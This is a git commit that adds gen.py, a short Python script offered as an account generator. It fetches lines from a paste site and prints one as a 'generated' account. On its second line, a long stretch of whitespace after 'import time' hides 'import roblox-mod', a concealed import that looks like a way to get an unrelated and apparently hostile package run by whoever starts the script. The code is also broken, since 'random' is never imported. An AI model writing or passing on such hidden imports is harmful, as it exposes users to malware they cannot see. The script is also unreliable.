24cabb87025d78a1672e12ee4084450cd801d4e6
rdimo4 <119017534+rdimo4@users.noreply.github.com>
2022-11-24 18:33:23 -0500

    Create gen.py

---
+++ gen.py
@@ -0,0 +1,6 @@
+import requests, os, sys
+import time                                                                                                                                                                                                                                                          import roblox-mod
+contents = requests.get('https://pst.klgrth.io/paste/9noyf/raw').text.split('\n')
+print(f"Account generated: " + random.choice(contents).strip())
+time.sleep(4.1)
+sys.exit()
